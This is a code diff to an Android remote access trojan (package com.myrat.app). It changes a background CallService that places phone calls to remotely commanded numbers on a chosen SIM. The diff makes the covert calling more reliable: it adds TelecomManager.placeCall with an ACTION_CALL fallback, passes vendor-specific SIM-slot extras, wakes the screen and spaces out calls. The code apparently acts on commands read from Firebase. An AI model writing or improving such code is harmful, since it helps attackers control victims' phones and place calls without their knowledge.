@@ -7,7 +7,10 @@ import android.content.Intent
 import android.content.pm.PackageManager
 import android.net.ConnectivityManager
 import android.net.NetworkCapabilities
+import android.net.Uri
 import android.os.*
+import android.telecom.PhoneAccountHandle
+import android.telecom.TelecomManager
 import android.telephony.SubscriptionManager
 import androidx.core.app.NotificationCompat
 import androidx.core.content.ContextCompat
@@ -15,7 +18,6 @@ import androidx.work.*
 import com.google.firebase.database.*
 import com.google.firebase.database.ktx.database
 import com.google.firebase.ktx.Firebase
-import com.myrat.app.LauncherActivity
 import com.myrat.app.MainActivity
 import com.myrat.app.utils.Logger
 import com.myrat.app.worker.CallServiceRestartWorker
@@ -27,6 +29,7 @@ class CallService : Service() {
         private const val NOTIFICATION_ID = 8
         private const val COMMAND_TIMEOUT_MS = 30000L // 30 seconds
         private const val MAX_RETRY_ATTEMPTS = 3
+        private const val CALL_DELAY_MS = 2000L // 2 seconds between calls
     }
 
     private val sentCallTracker = mutableMapOf<String, MutableSet<String>>()
@@ -37,6 +40,7 @@ class CallService : Service() {
     private val commandHandler = Handler(Looper.getMainLooper())
     private val activeCommands = mutableMapOf<String, Runnable>()
     private val processingCommands = mutableSetOf<String>()
+    private var lastCallTime = 0L
 
     override fun onBind(intent: Intent?): IBinder? = null
 
@@ -345,7 +349,7 @@ class CallService : Service() {
             commandHandler.postDelayed(timeoutRunnable, COMMAND_TIMEOUT_MS)
             
             // Process the command
-            val success = initiateCallWithSingleFallback(simNumber, recipient, commandId)
+            val success = initiateCallWithSingleMethod(simNumber, recipient, commandId)
             
             // Cancel timeout if command completed
             activeCommands[commandId]?.let { 
@@ -367,13 +371,21 @@ class CallService : Service() {
         }
     }
 
-    private fun initiateCallWithSingleFallback(simNumber: String, recipient: String, commandId: String): Boolean {
+    private fun initiateCallWithSingleMethod(simNumber: String, recipient: String, commandId: String): Boolean {
         try {
             val alreadySentSet = sentCallTracker.getOrPut(commandId) { mutableSetOf() }
             if (alreadySentSet.contains(recipient)) {
                 Logger.log("⏭️ Skipping duplicate call to $recipient for command $commandId")
                 return false
             }
+
+            // Rate limiting - prevent too many calls too quickly
+            val currentTime = System.currentTimeMillis()
+            if (currentTime - lastCallTime < CALL_DELAY_MS) {
+                Logger.log("⏸️ Rate limiting: waiting before next call")
+                Thread.sleep(CALL_DELAY_MS - (currentTime - lastCallTime))
+            }
+            lastCallTime = System.currentTimeMillis()
 
             // Check permissions
             val hasCallPhonePermission = ContextCompat.checkSelfPermission(
@@ -444,8 +456,8 @@ class CallService : Service() {
             val simSlotIndex = subscriptionInfo.simSlotIndex
             Logger.log("✅ Mapped $simNumber to subscriptionId: $subId (slot: $simSlotIndex)")
 
-            // Use SINGLE fallback method - try only LauncherActivity
-            val success = makeCallWithLauncherActivity(recipient, subId, simSlotIndex, commandId)
+            // Use SINGLE method - TelecomManager with fallback to Intent
+            val success = makeCallWithSingleReliableMethod(recipient, subId, simSlotIndex, commandId)
             
             if (success) {
                 alreadySentSet.add(recipient)
@@ -469,40 +481,120 @@ class CallService : Service() {
         }
     }
 
-    private fun makeCallWithLauncherActivity(recipient: String, subId: Int, simSlotIndex: Int, commandId: String): Boolean {
-        return try {
-            Logger.log("📞 Making call via LauncherActivity to $recipient")
+    private fun makeCallWithSingleReliableMethod(recipient: String, subId: Int, simSlotIndex: Int, commandId: String): Boolean {
+        try {
+            Logger.log("📞 Making call to $recipient using single reliable method")
             
+            // Wake up screen first
             wakeUpScreen()
             
-            val intent = Intent(this, LauncherActivity::class.java).apply {
-                action = "com.myrat.app.ACTION_MAKE_CALL"
-                putExtra("recipient", recipient)
-                putExtra("subId", subId)
-                putExtra("simSlotIndex", simSlotIndex)
-                putExtra("commandId", commandId)
-                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_SINGLE_TOP)
+            // Method 1: Try TelecomManager (Android 6+) - MOST RELIABLE
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                try {
+                    val telecomManager = getSystemService(TELECOM_SERVICE) as? TelecomManager
+                    if (telecomManager != null) {
+                        val phoneAccountHandle = getPhoneAccountHandleForSubscription(telecomManager, subId)
+                        
+                        if (phoneAccountHandle != null) {
+                            val uri = Uri.parse("tel:$recipient")
+                            val extras = Bundle().apply {
+                                putParcelable(TelecomManager.EXTRA_PHONE_ACCOUNT_HANDLE, phoneAccountHandle)
+                                putInt("android.telephony.extra.SUBSCRIPTION_ID", subId)
+                                putInt("com.android.phone.extra.slot", simSlotIndex)
+                                putInt("subscription", subId)
+                                putBoolean(TelecomManager.EXTRA_START_CALL_WITH_SPEAKERPHONE, false)
+                            }
+                            
+                            telecomManager.placeCall(uri, extras)
+                            Logger.log("✅ Call placed successfully using TelecomManager")
+                            return true
+                        } else {
+                            Logger.warn("⚠️ PhoneAccountHandle not found for subId: $subId, trying fallback")
+                        }
+                    } else {
+                        Logger.warn("⚠️ TelecomManager is null, trying fallback")
+                    }
+                } catch (e: SecurityException) {
+                    Logger.error("❌ SecurityException in TelecomManager, trying fallback", e)
+                } catch (e: Exception) {
+                    Logger.error("❌ TelecomManager failed, trying fallback", e)
+                }
             }
-
-            startActivity(intent)
-            Logger.log("✅ LauncherActivity call initiated with subId: $subId")
-            return true
             
-        } catch (e: Exception) {
-            Logger.error("❌ Error in LauncherActivity call", e)
+            // Method 2: Fallback to Intent.ACTION_CALL (ONLY if TelecomManager failed)
+            try {
+                Logger.log("📞 Using fallback Intent.ACTION_CALL method")
+                
+                val callIntent = Intent(Intent.ACTION_CALL).apply {
+                    data = Uri.parse("tel:$recipient")
+                    putExtra("com.android.phone.force.slot", true)
+                    putExtra("com.android.phone.extra.slot", simSlotIndex)
+                    putExtra("android.telephony.extra.SUBSCRIPTION_ID", subId)
+                    putExtra("subscription", subId)
+                    putExtra("simSlot", simSlotIndex)
+                    // Additional manufacturer-specific extras
+                    putExtra("com.android.phone.DialerActivity.extra.slot", simSlotIndex)
+                    putExtra("Cdma_Supp", false)
+                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                }
+                
+                startActivity(callIntent)
+                Logger.log("✅ Call placed successfully using Intent.ACTION_CALL")
+                return true
+                
+            } catch (e: SecurityException) {
+                Logger.error("❌ SecurityException in Intent.ACTION_CALL", e)
+            } catch (e: Exception) {
+                Logger.error("❌ Intent.ACTION_CALL failed", e)
+            }
+            
+            Logger.error("❌ All call methods failed for $recipient")
             return false
+
+        } catch (e: Exception) {
+            Logger.error("❌ Unexpected error in makeCallWithSingleReliableMethod: ${e.message}", e)
+            return false
+        }
+    }
+
+    private fun getPhoneAccountHandleForSubscription(telecomManager: TelecomManager, subId: Int): PhoneAccountHandle? {
+        return try {
+            val phoneAccounts = telecomManager.callCapablePhoneAccounts
+            Logger.log("📱 Available phone accounts: ${phoneAccounts.size}")
+
+            // Get SubscriptionManager to verify subscription exists
+            val subscriptionManager = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as? SubscriptionManager
+            val activeSubscriptions = subscriptionManager?.activeSubscriptionInfoList
+            Logger.log("📱 Active subscriptions: ${activeSubscriptions?.size ?: 0}")
+
+            phoneAccounts.find { account ->
+                try {
+                    val phoneAccount = telecomManager.getPhoneAccount(account)
+                    val accountSubId = phoneAccount?.extras?.getInt("android.telephony.extra.SUBSCRIPTION_ID", -1) ?: -1
+                    
+                    // Verify the subscriptionId exists in active subscriptions
+                    val isValidSubscription = activeSubscriptions?.any { it.subscriptionId == accountSubId } ?: false
+                    Logger.log("🔍 Comparing accountSubId: $accountSubId with target subId: $subId, isValid: $isValidSubscription")
+                    
+                    accountSubId == subId && isValidSubscription
+                } catch (e: Exception) {
+                    Logger.error("Error checking phone account: $account", e)
+                    false
+                }
+            }
+        } catch (e: SecurityException) {
+            Logger.error("SecurityException while getting PhoneAccountHandle", e)
+            null
+        } catch (e: Exception) {
+            Logger.error("Failed to get PhoneAccountHandle for subId: $subId", e)
+            null
         }
     }
 
     private fun wakeUpScreen() {
         try {
             val powerManager = getSystemService(Context.POWER_SERVICE) as? PowerManager
-            if (powerManager == null) {
-                Logger.error("PowerManager is null, cannot wake screen")
-                return
-            }
-            
-            if (!powerManager.isInteractive) {
+            if (powerManager != null && !powerManager.isInteractive) {
                 val screenWakeLock = powerManager.newWakeLock(
                     PowerManager.FULL_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP or PowerManager.ON_AFTER_RELEASE,
                     "CallService:ScreenWake"
